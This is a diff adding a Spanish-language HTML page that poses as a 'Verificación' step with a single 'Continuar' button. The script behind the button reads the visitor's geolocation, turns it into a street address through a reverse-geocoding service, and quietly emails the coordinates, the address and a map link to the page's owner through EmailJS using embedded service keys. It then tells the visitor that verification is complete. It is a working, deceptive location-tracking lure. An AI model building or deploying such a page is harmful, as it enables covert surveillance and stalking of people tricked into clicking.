@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificación</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("L4wkgDOuz9isZto4k"); // Public Key
+    })();
+  </script>
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #6e8efb, #a777e3);
+      background-size: 400% 400%;
+      animation: gradient 10s ease infinite;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 30px 20px;
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+      max-width: 90%;
+      width: 380px;
+    }
+
+    h1 {
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background: #ffffff;
+      color: #6e8efb;
+      padding: 15px 30px;
+      font-size: 16px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: 0.3s ease;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background: #d0c9f3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Verificación</h1>
+    <p>Presiona el botón para continuar</p>
+    <button onclick="getLocation()">Continuar</button>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+      } else {
+        alert("Geolocalización no soportada.");
+      }
+    }
+
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+      fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
+        .then(response => response.json())
+        .then(data => {
+          const direccion = data.display_name || "No disponible";
+
+          emailjs.send("service_u9hn50k", "template_ilvuo2s", {
+            latitud: lat,
+            longitud: lon,
+            direccion: direccion,
+            map_url: mapLink // este valor debes usar en tu plantilla EmailJS
+          }).then(function(response) {
+            alert("Gracias. Verificación completada.");
+          }, function(error) {
+            alert("Error al enviar la ubicación.");
+          });
+        });
+    }
+
+    function showError(error) {
+      alert("No se pudo obtener la ubicación.");
+    }
+  </script>
+</body>
+</html>
